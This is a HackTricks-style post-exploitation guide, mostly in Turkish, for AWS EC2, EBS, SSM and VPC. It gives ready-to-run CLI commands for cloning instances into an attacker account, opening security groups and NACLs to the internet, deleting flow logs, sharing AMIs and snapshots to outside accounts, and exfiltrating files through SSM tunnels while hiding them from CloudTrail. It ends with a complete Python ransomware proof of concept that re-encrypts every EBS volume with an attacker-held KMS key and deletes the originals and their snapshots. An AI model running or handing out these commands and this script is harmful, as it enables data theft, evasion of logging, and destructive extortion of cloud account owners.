# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring, herhangi bir yazılım kurmaya gerek kalmadan VPC içindeki EC2 instance'ların gelen ve giden trafiğini **çoğaltır**. Bu çoğaltılmış trafik genellikle analiz ve izleme için bir network intrusion detection system (IDS) gibi bir şeye gönderilir.  
Bir saldırgan bunu kötüye kullanarak tüm trafiği yakalayabilir ve buradan hassas bilgileri elde edebilir:

Daha fazla bilgi için şu sayfaya bakın:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances genellikle bazı hassas bilgiler içerir. İçeri girmek için farklı yollar vardır (bakınız [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ancak, içinde ne olduğunu kontrol etmenin bir diğer yolu **bir AMI oluşturmak ve ondan yeni bir instance (hatta kendi hesabınızda bile) çalıştırmaktır**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, bunlar genellikle **hassas bilgiler** içerir; bu yüzden onları kontrol etmek bu bilgileri ortaya çıkaracaktır.  
Eğer bir **volume without a snapshot** bulursanız şunları yapabilirsiniz: **Create a snapshot** oluşturup aşağıdaki işlemleri gerçekleştirmek veya sadece hesabın içindeki bir **instance**'a **mount it in an instance**:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI'yi doğrudan S3'e `CreateStoreImageTask` kullanarak export ederek snapshot sharing olmadan ham bir disk görüntüsü elde edin. Bu, instance networking'i etkilemeden tam offline forensics veya data theft yapılmasına olanak verir.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

io1/io2 Multi-Attach volume'u ikinci bir instance'a attach edin ve snapshots olmadan canlı veriyi çekmek için read-only mount edin. Hedef volume zaten aynı AZ içinde Multi-Attach etkinse kullanışlıdır.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

EC2 Instance Connect Endpoint oluşturun, ingress yetkilendirin ve managed tunnel üzerinden private instance'lara erişmek için ephemeral SSH key'ler enjekte edin. Public port açmadan hızlı lateral movement yolları sağlar.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Kurban ENI'nin secondary private IP'sini saldırgan kontrolündeki bir ENI'ye taşıyarak IP ile allowlisted olan güvenilir host'ları taklit edin. Bu, belirli adreslere bağlı internal ACL'leri veya SG kurallarını bypass etmeyi sağlar.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Kurban instance'tan bir Elastic IP'yi saldırgana reassociate ederek gelen trafiği intercept edin veya trusted public IP'lerden geliyormuş gibi görünen outbound bağlantılar başlatın.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Eğer bir security group kuralı customer-managed prefix list'e referans veriyorsa, listeye saldırgan CIDR'leri eklemek SG'yi değiştirmeden bağlı her SG kuralı için erişimi sessizce genişletir.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

İzol edilmiş subnet'lerden outbound erişimi geri kazanmak için gateway veya interface VPC endpoint'leri oluşturun. AWS-managed private links'i kullanmak, data exfiltration için eksik IGW/NAT kontrollerini bypass eder.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngress yetkisine sahip bir saldırgan security group'lara inbound kuralları ekleyebilir (ör. 0.0.0.0/0'dan tcp:80'e izin vermek), böylece internal servisleri public Internet'e veya aksi halde yetkisiz ağlara açar.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
ec2:ReplaceNetworkAclEntry (veya benzeri) izinlere sahip bir saldırgan, bir subnet’in Network ACLs (NACLs) yapılandırmasını çok izin verici olacak şekilde değiştirebilir — örneğin kritik portlarda 0.0.0.0/0 izni vererek — bu da tüm subnet aralığını İnternet'e veya yetkisiz ağ segmentlerine açar. Per-instance olarak uygulanan Security Groups'un aksine, NACLs subnet seviyesinde uygulanır; bu nedenle kısıtlayıcı bir NACL'i değiştirmek, çok daha fazla hosta erişime izin vererek çok daha geniş bir etki alanı oluşturabilir.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

ec2:Delete* ve iam:Remove* izinlerine sahip bir saldırgan, key pairs, launch templates/versions, AMIs/snapshots, volumes veya attachments, security groups veya rules, ENIs/network endpoints, route tables, gateways veya managed endpoints gibi kritik altyapı kaynaklarını ve yapılandırmalarını silebilir. Bu, anında hizmet kesintisine, veri kaybına ve adli delillerin kaybına yol açabilir.

Bir örnek bir security group silmektir:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Hesaplar Arası Exfiltration

VPC Flow Logs'u saldırganın kontrolündeki bir S3 bucket'a yönlendirerek mağdur hesabın dışında ağ meta verilerini (kaynak/hedef, portlar) uzun vadeli keşif için sürekli toplayabilirsiniz.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Veri Exfiltration

#### DNS Exfiltration

EC2'yi hiç trafik çıkamayacak şekilde kısıtlarsanız bile, yine de **exfil via DNS** yapabilir.

- **VPC Flow Logs bunu kaydetmez**.
- AWS DNS logs'a erişiminiz yok.
- Bunu şu komutla devre dışı bırakın: "enableDnsSupport"u false yaparak:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Bir saldırgan, kendisinin kontrolündeki bir hesabın API endpoints'lerine çağrı yapabilir. Cloudtrail bu çağrıları kaydedecek ve saldırgan Cloudtrail loglarında exfiltrate edilen veriyi görebilecektir.

### Security Group'u Açma

Bu şekilde portları açarak ağ servislerine daha fazla erişim elde edebilirsiniz:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Bir EC2 instance'ı çalıştırıp onu ECS instance'larını çalıştırmak için kayıt ettirerek, ECS instance'larının verilerini çalmak mümkündür.

Daha fazla bilgi için [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Gerekli izinler:

- `ssm:StartSession`

Komut çalıştırmanın ötesinde, SSM trafik tünellemeye izin verir; bu, Security Groups veya NACLs nedeniyle ağ erişimi olmayan EC2 instance'larından pivoting yapmak için kötüye kullanılabilir.
Bunun kullanışlı olduğu senaryolardan biri, bir [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) üzerinden özel bir EKS cluster'a pivoting yapmaktır.

> Bir oturum başlatmak için SessionManagerPlugin'in yüklü olması gerekir: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Makinenize SessionManagerPlugin'i yükleyin
2. Aşağıdaki komutla Bastion EC2'ye giriş yapın:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 AWS geçici kimlik bilgilerini [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) scripti ile alın
4. Kimlik bilgilerini kendi makinenize `$HOME/.aws/credentials` dosyasına `[bastion-ec2]` profili olarak aktarın
5. Bastion EC2 olarak EKS'e giriş yapın:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` dosyasındaki `server` alanını `https://localhost` olacak şekilde güncelleyin
7. Aşağıdaki gibi bir SSM tüneli oluşturun:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` aracından gelen trafik artık SSM tüneli üzerinden Bastion EC2 aracılığıyla yönlendirilir ve kendi makinenizden aşağıdakini çalıştırarak özel EKS kümesine erişebilirsiniz:
```shell
kubectl get pods --insecure-skip-tls-verify
```
SSL bağlantılarının başarısız olacağını unutmayın; `--insecure-skip-tls-verify` bayrağını (veya K8s audit araçlarındaki eşdeğerini) ayarlamazsanız. Trafiğin güvenli AWS SSM tüneli üzerinden yönlendirildiğini gördüğünüz için herhangi bir MitM saldırısından korunursunuz.

Son olarak, bu teknik private EKS cluster'larına saldırmaya özgü değildir. Rastgele domainler ve portlar ayarlayarak herhangi bir diğer AWS servisine veya özel bir uygulamaya pivot yapabilirsiniz.

---

#### Hızlı Yerel ↔️ Uzak Port Yönlendirme (AWS-StartPortForwardingSession)

Eğer yalnızca **EC2 instance'ından yerel hostunuza tek bir TCP portunu yönlendirmeniz** gerekiyorsa `AWS-StartPortForwardingSession` SSM dokümanını kullanabilirsiniz (uzak host parametresi gerekmez):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

Yaygın kullanım örnekleri:

* **File exfiltration**
1. Instance üzerinde, exfiltrate etmek istediğiniz dizini işaret eden hızlı bir HTTP server başlatın:

```bash
python3 -m http.server 8000
```

2. Workstation'ınızdan dosyaları SSM tunnel üzerinden çekin:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Accessing internal web applications (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
İpucu: Kanıtları exfiltrating etmeden önce sıkıştırın ve şifreleyin, böylece CloudTrail açık metin içeriğini kaydetmez:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI Paylaş
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Genel veya özel AMIs içinde hassas bilgi arama

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel, **genel veya özel Amazon Machine Images (AMIs) içindeki hassas bilgileri aramak** için tasarlanmış bir araçtır. Hedef AMIs'den instance başlatma, volume'larını mount etme ve potansiyel secrets veya hassas verileri tarama sürecini otomatikleştirir.

### EBS Snapshot Paylaş
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notlarında gösterilen Ransomware gösterimine benzer bir kavram kanıtı (PoC). KMS, çeşitli AWS hizmetlerini şifrelemek için kullanmanın ne kadar kolay olduğuna bağlı olarak Ransomware Management Service (RMS) olarak yeniden adlandırılmalıdır.

Önce 'attacker' AWS hesabından KMS içinde bir customer managed key oluşturun. Bu örnekte anahtar verisini AWS'in bizim için yönetmesine izin vereceğiz, ancak gerçekçi bir senaryoda kötü niyetli bir aktör anahtar verisini AWS kontrolünün dışında tutacaktır. Anahtar politikasını, herhangi bir AWS account Principal'in anahtarı kullanmasına izin verecek şekilde değiştirin. Bu anahtar politikası için hesabın adı 'AttackSim' idi ve tüm erişime izin veren politika kuralı 'Outside Encryption' olarak adlandırıldı.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Şimdi kullanmak için herkese açık erişilebilir bir anahtarımız olduğuna göre. Bu amaçla, şifrelenmemiş EBS hacimleri bağlı bazı EC2 instance'ları bulunan bir 'victim' hesabı kullanabiliriz. Bu 'victim' hesabının EBS hacimleri şifreleme hedefimizdir; bu saldırı, yüksek ayrıcalıklara sahip bir AWS hesabının ihlali varsayımı altında gerçekleştirilmektedir.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ransomware örneğine benzer. Bu saldırı, bağlı EBS hacimlerinin kopyalarını snapshots kullanarak oluşturacak, 'attacker' hesabındaki herkese açık anahtarı yeni EBS hacimlerini şifrelemek için kullanacak, ardından orijinal EBS hacimlerini EC2 instance'larından ayırıp silecek ve son olarak yeni şifreli EBS hacimlerini oluşturmak için kullanılan snapshots'ları silecek. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Bunun sonucu olarak hesapta yalnızca şifrelenmiş EBS hacimleri kalır.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ayrıca dikkat edilmesi gereken, scriptin orijinal EBS hacimlerini ayırıp silmek için EC2 instance'larını durdurmuş olmasıdır. Orijinal şifrelenmemiş hacimler artık yok.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Son olarak, 'attacker' hesabındaki key policy'ye geri dönün ve key policy'den 'Outside Encryption' politika kuralını kaldırın.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Yeni ayarlanan key policy'nin yayılması için biraz bekleyin. Ardından 'victim' hesabına dönün ve yeni şifrelenmiş EBS hacimlerinden birini attach etmeyi deneyin. Hacmi attach edebildiğinizi göreceksiniz.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ama şifrelenmiş EBS hacmiyle EC2 instance'ını gerçekten başlatmaya çalıştığınızda işlem başarısız olur ve bağlı EBS hacmi anahtar tarafından deşifre edilemediği için instance 'pending' durumundan tekrar sürekli olarak 'stopped' durumuna döner; çünkü key policy artık buna izin vermez.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu kullanılan python script'idir. Şifreleme için kullanılacak anahtarın genel olarak erişilebilir bir AWS ARN değeri ve 'victim' hesabına ait AWS creds alır. Script, hedef AWS hesabındaki tüm EC2 instance'lara bağlı ALL kullanılabilir EBS hacimlerinin şifrelenmiş kopyalarını oluşturur, sonra her EC2 instance'ını durdurur, orijinal EBS hacimlerini detach eder, bunları siler ve süreçte kullanılan tüm snapshots'ları son olarak siler. Bu, hedeflenen 'victim' hesabında yalnızca şifrelenmiş EBS hacimlerinin kalmasına neden olur. ONLY USE THIS SCRIPT IN A TEST ENVIRONMENT, IT IS DESTRUCTIVE AND WILL DELETE ALL THE ORIGINAL EBS VOLUMES. KMS key'i kullanarak bunları geri kurtarabilir ve snapshots üzerinden orijinal hallerine geri yükleyebilirsiniz, ancak günün sonunda bunun bir ransomware PoC olduğunu bilmenizi istedim.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Referanslar

- [Pentest Partners – SSM kullanarak AWS'de dosya transferi](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
